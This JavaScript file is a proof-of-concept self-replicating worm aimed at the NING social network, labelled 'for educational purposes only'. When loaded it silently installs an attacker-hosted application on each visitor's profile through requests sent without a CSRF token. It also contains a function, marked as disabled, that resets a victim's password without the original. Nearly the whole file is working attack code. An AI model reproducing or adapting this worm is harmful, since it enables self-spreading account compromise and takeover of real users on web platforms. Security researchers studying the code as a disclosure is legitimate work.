/*
    _/      _/  _/_/_/  _/      _/    _/_/_/    _/_/    
   _/_/    _/    _/    _/_/    _/  _/        _/    _/   
  _/  _/  _/    _/    _/  _/  _/  _/  _/_/  _/_/_/_/    
 _/    _/_/    _/    _/    _/_/  _/    _/  _/    _/     
_/      _/  _/_/_/  _/      _/    _/_/_/  _/    _/   

*****************************************************
A proof of concept, self replicating, social network
based malware. Created for educational purposes only!
*****************************************************     
Created by James Bercegay | 0x6a616d6573.blogspot.com
*****************************************************                                                
*/

// Location of NING application payload
var evil_napp = 'http://www.example.com/ninga.xml';

// Create an AJAX object
var evil_ajax = get_ajax();

// Get AJAX object
function get_ajax()
{
	if ( window.XMLHttpRequest ) 
	{
		// Standard object
		return new XMLHttpRequest();
	}
	else if ( window.ActiveXObject ) 
	{
		// Internet Explorer
		return new ActiveXObject("Microsoft.XMLHTTP");
	}
	else
	{
		// Epic fail
		alert("Unable to init AJAX object!");
		return false;
	}
}

// A Proof of Concept function that will silently reset
// the users password without needing to know original!
// I left this function disabled for obvious reasons ;]
function set_password(pass)
{
	// Set up AJAX request
	evil_ajax.open('POST', '/main/authorization/updatePassword', true);
	
	// Define the Content-Type
    evil_ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	// AJAX callback handler
    evil_ajax.onreadystatechange = function() 
	{
		// Rehtuhgo
        if ( evil_ajax.readyState == 4 ) 
		{
			// NING response object
            var ning_response = evil_ajax.responseText;
        }
    }
	
	// Send the request. Token is not required :]
    evil_ajax.send('xg_token=&password=' + pass);
}

// Self replicating code to silently install the NING
// application to the visiting user's profile.
function get_app()
{

	// Set up AJAX request
    evil_ajax.open('POST', '/opensocial/application/add', true);
	
	// Define the Content-Type
    evil_ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	// AJAX callback handler
    evil_ajax.onreadystatechange = function() 
	{
		// Rehtuhgo
        if ( evil_ajax.readyState == 4 ) 
		{
			// NING response object
            var ning_response = evil_ajax.responseText;
        }
    }
	
	// Send the request. Token is not required :]
    evil_ajax.send('xg_token=&installedByUrl=1&appUrl=' + evil_napp);
}

// NINGA!
get_app();


